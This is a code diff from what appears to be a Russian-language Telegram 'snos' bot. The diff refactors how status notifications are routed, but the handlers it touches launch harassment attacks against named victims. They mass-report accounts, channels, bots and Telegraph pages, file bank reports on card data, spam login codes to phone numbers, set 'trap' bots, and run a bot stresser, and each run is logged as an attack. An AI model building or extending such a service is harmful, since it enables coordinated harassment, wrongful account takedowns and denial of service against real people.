@@ -479,12 +479,14 @@ async def session_got_username(message: types.Message, state: FSMContext):
 async def session_got_phone(message: types.Message, state: FSMContext):
     data = await state.get_data()
     await state.finish()
-    set_bot_session(bot)
+    _bot_token = data.get('_bot_token')
+    _bot = Bot(token=_bot_token) if (_bot_token and _bot_token != config.TOKEN) else bot
     asyncio.create_task(main_session_snos(
         message.from_user.id,
         message.from_user.username or "",
         data['victim_username'],
-        message.text.strip()
+        message.text.strip(),
+        notify_bot=_bot
     ))
 
 @dp.message_handler(commands=['on'])
@@ -1285,7 +1287,7 @@ async def _dsa_generate_and_show(uid: int, bot_instance, dp_instance, state):
 
 async def _dsa_launch(uid: int, bot_instance, fsm_data: dict, state):
 	"""Запускает DSA репорт с данными из FSM."""
-	from dsa_snos import main_dsa_snos, set_bot_dsa
+	from dsa_snos import main_dsa_snos
 	link = fsm_data.get("dsa_link", "")
 	reason_key = fsm_data.get("dsa_reason", "other")
 	sub_key = fsm_data.get("dsa_sub", "")
@@ -1303,7 +1305,6 @@ async def _dsa_launch(uid: int, bot_instance, fsm_data: dict, state):
 		parse_mode="Markdown")
 
 	try:
-		set_bot_dsa(_bot)
 		await main_dsa_snos(link, uid, username, reason_key, sub_key, text, count=1, _bot=_bot)
 		try: await db.log_attack(uid, link, "dsa")
 		except Exception as e: print(f"[HISTORY] dsa log error: {e}", flush=True)
@@ -1320,7 +1321,6 @@ async def _dsa_launch(uid: int, bot_instance, fsm_data: dict, state):
 		await _bot.send_message(uid, f'❌ *Ошибка DSA:* `{str(e)[:100]}`',
 			parse_mode="Markdown", reply_markup=main_menu)
 	finally:
-		set_bot_dsa(bot)
 		if _is_mirror:
 			try:
 				s = await _bot.get_session(); await s.close()
@@ -2843,8 +2843,7 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 				f'🟣 *Запускаю TIDA на* `{tida_link}`*...*',
 				parse_mode="Markdown")
 			try:
-				set_bot_tida(_bot)
-				await main_tida(tida_link, tida_text, uid, tida_username)
+				await main_tida(tida_link, tida_text, uid, tida_username, notify_bot=_bot)
 				try: await db.log_attack(uid, tida_link, "tida")
 				except Exception as e: print(f"[HISTORY] tida-ai log error: {e}", flush=True)
 				# Предлагаем мониторинг
@@ -2853,7 +2852,6 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 				print(f"[TIDA-AI] ОШИБКА: {e}", flush=True)
 				await _bot.send_message(uid, f'❌ *Ошибка TIDA:* `{str(e)[:100]}`', parse_mode="Markdown", reply_markup=main_menu)
 			finally:
-				set_bot_tida(bot)
 				_tida_pending.pop(uid, None)
 
 		elif d == "tida_text_change":
@@ -2976,15 +2974,13 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 				f'*└─ Отправляем 12 жалоб*',
 				parse_mode="Markdown")
 			try:
-				set_bot_telegraph(_bot)
-				await main_telegraph_snos(article_url, uid, username, custom_text=body, custom_subject=subject)
+				await main_telegraph_snos(article_url, uid, username, custom_text=body, custom_subject=subject, notify_bot=_bot)
 				try: await db.log_attack(uid, article_url, "telegraph")
 				except Exception as e: print(f"[HISTORY] telegraph-cb log error: {e}", flush=True)
 			except Exception as e:
 				print(f"[TELEGRAPH] ОШИБКА: {e}", flush=True)
 				await _bot.send_message(uid, f'❌ *Ошибка:* `{str(e)[:100]}`', parse_mode="Markdown", reply_markup=main_menu)
 			finally:
-				set_bot_telegraph(bot)
 				if _is_mirror_bot:
 					try:
 						s = await _bot.get_session(); await s.close()
@@ -3566,8 +3562,7 @@ async def bot_snos_step1(message: types.Message, state: FSMContext):
 
 	_is_mirror_bot = bool(_bot_token and _bot_token != config.TOKEN)
 	try:
-		set_bot_snos(_bot)
-		await main_bot_snos(bot_target, reason_key, uid, username, bot_target)
+		await main_bot_snos(bot_target, reason_key, uid, username, bot_target, notify_bot=_bot)
 		try: await db.log_attack(uid, bot_target, "bot")
 		except Exception as e: print(f"[HISTORY] bot log error: {e}", flush=True)
 		# Предлагаем мониторинг
@@ -3584,7 +3579,6 @@ async def bot_snos_step1(message: types.Message, state: FSMContext):
 		traceback.print_exc()
 		await _bot.send_message(uid, f'❌ *Ошибка бот-метода:* `{str(e)[:100]}`', parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu)
 	finally:
-		set_bot_snos(bot)
 		if _is_mirror_bot:
 			try:
 				session = await _bot.get_session()
@@ -3654,8 +3648,7 @@ async def channel_step1(message: types.Message, state: FSMContext):
 	await _bot.send_message(uid, t('channel_launching', lang, target=f'{ch_target}{msg_info}'), parse_mode="Markdown")
 
 	try:
-		set_bot_channel(_bot)
-		await main_channel_snos(ch_target, reason_key, uid, username, message_id=message_id)
+		await main_channel_snos(ch_target, reason_key, uid, username, message_id=message_id, notify_bot=_bot)
 		try: await db.log_attack(uid, ch_target, "channel")
 		except Exception as e: print(f"[HISTORY] channel log error: {e}", flush=True)
 		# Предлагаем мониторинг
@@ -3670,8 +3663,6 @@ async def channel_step1(message: types.Message, state: FSMContext):
 		print(f"[CH-SNOS] КРИТИЧЕСКАЯ ОШИБКА: {e}", flush=True)
 		await _bot.send_message(uid, f'❌ *Ошибка канал-метода:* `{str(e)[:100]}`', parse_mode="Markdown", reply_markup=main_menu)
 	finally:
-		from channel_snos import set_bot_channel as _set_ch
-		_set_ch(bot)
 		if _is_mirror_bot:
 			try:
 				s = await _bot.get_session(); await s.close()
@@ -3825,15 +3816,13 @@ async def telegraph_custom_text(message: types.Message, state: FSMContext):
 		parse_mode="Markdown")
 
 	try:
-		set_bot_telegraph(_bot)
-		await main_telegraph_snos(article_url, uid, username, custom_text=custom_body, custom_subject=custom_subject)
+		await main_telegraph_snos(article_url, uid, username, custom_text=custom_body, custom_subject=custom_subject, notify_bot=_bot)
 		try: await db.log_attack(uid, article_url, "telegraph")
 		except Exception as e: print(f"[HISTORY] telegraph log error: {e}", flush=True)
 	except Exception as e:
 		print(f"[TELEGRAPH] ОШИБКА: {e}", flush=True)
 		await _bot.send_message(uid, f'❌ *Ошибка:* `{str(e)[:100]}`', parse_mode="Markdown", reply_markup=main_menu)
 	finally:
-		set_bot_telegraph(bot)
 		if _is_mirror_bot:
 			try:
 				s = await _bot.get_session(); await s.close()
@@ -4001,15 +3990,13 @@ async def tida_step2(message: types.Message, state: FSMContext):
 		parse_mode="Markdown")
 
 	try:
-		set_bot_tida(_bot)
-		await main_tida(target_link, custom_text, uid, username)
+		await main_tida(target_link, custom_text, uid, username, notify_bot=_bot)
 		try: await db.log_attack(uid, target_link, "tida")
 		except Exception as e: print(f"[HISTORY] tida log error: {e}", flush=True)
 	except Exception as e:
 		print(f"[TIDA] КРИТИЧЕСКАЯ ОШИБКА: {e}", flush=True)
 		await _bot.send_message(uid, f'❌ *Ошибка TIDA:* `{str(e)[:100]}`', parse_mode="Markdown", reply_markup=main_menu)
 	finally:
-		set_bot_tida(bot)
 		if _is_mirror_bot:
 			try:
 				s = await _bot.get_session(); await s.close()
@@ -4091,15 +4078,13 @@ async def bank_step1(message: types.Message, state: FSMContext):
 		last_used_bank[uid] = now_msk()
 
 	try:
-		set_bot_bank(_bot)
-		await process_bank_report(bank_key, card_data, uid, username)
+		await process_bank_report(bank_key, card_data, uid, username, notify_bot=_bot)
 		try: await db.log_attack(uid, f"bank:{card_data[:50]}", "bank")
 		except Exception as e: print(f"[HISTORY] bank log error: {e}", flush=True)
 	except Exception as e:
 		print(f"[BANK] КРИТИЧЕСКАЯ ОШИБКА: {e}", flush=True)
 		await _bot.send_message(uid, f'❌ *Ошибка:* `{str(e)[:100]}`', parse_mode="Markdown", reply_markup=main_menu)
 	finally:
-		set_bot_bank(bot)
 		if _is_mirror_bot:
 			try:
 				s = await _bot.get_session(); await s.close()
@@ -4130,13 +4115,11 @@ async def code_step1(message: types.Message, state: FSMContext):
 	await _bot.send_message(uid, t('code_launching', lang, phone=phone), parse_mode="Markdown")
 
 	try:
-		set_bot_code(_bot)
-		await main_code_snos(phone, uid, username)
+		await main_code_snos(phone, uid, username, notify_bot=_bot)
 	except Exception as e:
 		print(f"[CODE] КРИТИЧЕСКАЯ ОШИБКА: {e}", flush=True)
 		await _bot.send_message(uid, f'❌ *Ошибка:* `{str(e)[:100]}`', parse_mode="Markdown", reply_markup=main_menu)
 	finally:
-		set_bot_code(bot)
 		if _is_mirror_bot:
 			try:
 				s = await _bot.get_session(); await s.close()
@@ -4183,20 +4166,19 @@ async def trap_step1(message: types.Message, state: FSMContext):
 		parse_mode="Markdown")
 
 	try:
-		set_bot_trap(_bot)
 		await transfer_and_apply(
 			bot_token=trap_data["bot_token"],
 			bot_username=trap_data["bot_username"],
 			victim_username=raw,
 			user_id=uid,
-			username=username
+			username=username,
+			notify_bot=_bot
 		)
 	except Exception as e:
 		print(f"[TRAP] trap_step1 error: {e}", flush=True)
 		await _bot.send_message(uid, f'❌ *Ошибка trap:* `{str(e)[:100]}`',
 			parse_mode="Markdown", reply_markup=main_menu)
 	finally:
-		set_bot_trap(bot)
 		if _is_mirror_bot:
 			try:
 				s = await _bot.get_session(); await s.close()
@@ -4228,8 +4210,7 @@ async def profile_step1(message: types.Message, state: FSMContext):
 	)
 
 	try:
-		set_bot_profile(_bot)
-		await main_profile_snos(raw, uid, username)
+		await main_profile_snos(raw, uid, username, notify_bot=_bot)
 		try: await db.log_attack(uid, raw, "profile")
 		except Exception as e: print(f"[HISTORY] profile log error: {e}", flush=True)
 	except Exception as e:
@@ -4239,7 +4220,6 @@ async def profile_step1(message: types.Message, state: FSMContext):
 		await _bot.send_message(uid, f'❌ *Ошибка Profile-метода:* `{str(e)[:100]}`',
 			parse_mode="Markdown", reply_markup=main_menu)
 	finally:
-		set_bot_profile(bot)
 		if _is_mirror_bot:
 			try:
 				session = await _bot.get_session()
@@ -4285,10 +4265,8 @@ async def stress_step1(message: types.Message, state: FSMContext):
 		return
 
 	await _bot.send_message(uid, t('stress_launching', lang, target=bot_target), parse_mode="Markdown")
-	set_bot_stress(_bot)
-
 	try:
-		started = await main_bot_stress(bot_target, uid, username, is_admin)
+		started = await main_bot_stress(bot_target, uid, username, is_admin, notify_bot=_bot)
 		try: await db.log_attack(uid, bot_target, "stress")
 		except Exception as e: print(f"[HISTORY] stress log error: {e}", flush=True)
 		# КД только если атака успешно запустилась (нашлись кнопки)
@@ -4300,7 +4278,6 @@ async def stress_step1(message: types.Message, state: FSMContext):
 		traceback.print_exc()
 		await _bot.send_message(uid, f'❌ *Ошибка стрессера:* `{str(e)[:100]}`', parse_mode="Markdown", reply_markup=main_menu)
 	finally:
-		set_bot_stress(bot)
 		if _is_mirror_bot:
 			try:
 				session = await _bot.get_session()
@@ -4860,8 +4837,7 @@ async def _trap_create(uid: int, username: str, bot_token_instance: str):
 	"""Фоновая функция: создаёт бота через BotFather и сохраняет данные в _trap_sessions."""
 	_bot = Bot(token=bot_token_instance) if (bot_token_instance and bot_token_instance != config.TOKEN) else bot
 	try:
-		set_bot_trap(_bot)
-		result = await main_trap_snos(uid, username)
+		result = await main_trap_snos(uid, username, notify_bot=_bot)
 		if result.get("ok"):
 			_trap_sessions[uid] = {
 				"bot_token":    result["bot_token"],
@@ -4874,8 +4850,6 @@ async def _trap_create(uid: int, username: str, bot_token_instance: str):
 		print(f"[TRAP] _trap_create error: {e}", flush=True)
 		await _bot.send_message(uid, f'❌ *Ошибка trap:* `{str(e)[:100]}`',
 			parse_mode="Markdown", reply_markup=main_menu)
-	finally:
-		set_bot_trap(bot)
 
 
 async def _sub_expiry_notify_loop():
@@ -5469,7 +5443,6 @@ async def universal_step_link(message: types.Message, state: FSMContext):
 	status_msg = await _bot.send_message(uid,
 		f"⚙️ *Универсальный метод* — `{parsed['normalized']}`\n\n⏳ Запускаю...",
 		parse_mode="Markdown")
-	set_bot_universal(_bot)
 	cd_state = {
 		"user": uid, "admins": admins, "no_kd": no_kd,
 		"botnet": last_used_botnet, "botnet2": last_used_botnet2,
@@ -5497,7 +5470,6 @@ async def universal_step_tida_text(message: types.Message, state: FSMContext):
 	status_msg = await _bot.send_message(uid,
 		f"⚙️ *Универсальный метод* — `{parsed.get('normalized', '')}`\n\n⏳ Запускаю...",
 		parse_mode="Markdown")
-	set_bot_universal(_bot)
 	cd_state = {
 		"user": uid, "admins": admins, "no_kd": no_kd,
 		"botnet": last_used_botnet, "botnet2": last_used_botnet2,
